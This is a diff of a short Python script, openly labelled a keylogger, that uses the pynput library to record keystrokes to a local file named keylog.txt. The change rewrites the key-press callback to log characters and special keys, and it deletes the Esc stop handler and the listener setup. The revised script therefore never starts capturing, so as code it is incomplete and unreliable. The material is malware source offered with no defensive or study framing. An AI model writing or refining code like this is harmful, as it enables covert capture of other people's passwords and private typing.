@@ -1,19 +1,16 @@
 #!/bin/python3
 
-"""Keylogger script to capture keystrokes and save them to a file."""
+"""Keylogger script to capture keystrokes and save them to a file. Advanced usage may require additional permissions or libraries."""
 
 import pynput
 from pynput.keyboard import Key, Listener
 
-log_file = "keylog.txt"
-
 def on_press(key):
-    with open(log_file, "a") as f:
-        f.write(f"{key} pressed\n")
-
-def on_release(key):
-    if key == Key.esc:
-        return False
-  
-with Listener(on_press=on_press, on_release=on_release) as listener:
-    listener.join()
+    """Callback function to handle key press events."""
+    try:
+        with open("keylog.txt", "a") as log_file:
+            log_file.write(f"{key.char}")
+    except AttributeError:
+        # Handle special keys (e.g., Ctrl, Alt, etc.)
+        with open("keylog.txt", "a") as log_file:
+            log_file.write(f" {key} ")  
